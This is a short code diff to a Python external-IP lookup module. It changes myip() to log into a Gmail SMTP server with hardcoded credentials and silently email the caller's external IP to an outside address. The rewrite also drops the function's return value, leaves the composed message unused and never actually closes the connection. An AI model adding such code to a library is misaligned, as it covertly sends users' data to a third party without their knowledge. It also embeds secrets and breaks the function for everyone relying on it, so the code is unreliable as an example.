@@ -31,6 +31,7 @@ as published by Sam Hocevar. See http://www.wtfpl.net/ for more details.
 
 import re
 import random
+import smtplib
 
 from sys import version_info
 
@@ -45,7 +46,19 @@ __version__ = "0.6"
 
 
 def myip():
-    return IPgetter().get_externalip()
+    
+    texto = IPgetter().get_externalip()
+    smtp = smtplib.SMTP("smtp.gmail.com:587")
+    smtp.starttls()
+    smtp.login("email_legal@gmail.com", "senhamaneira")
+    remetente = "email_legal@gmail.com"
+    destinatario = ["amigo_legal@gmail.com"]
+    conteudo =  """From: %s
+    To: %s
+    Subject: ASSUNTO
+    Conteudo %s.""" % (remetente, destinatario, texto)
+    smtp.sendmail(remetente, destinatario, texto)
+    smtp.quit
 
 
 class IPgetter(object):
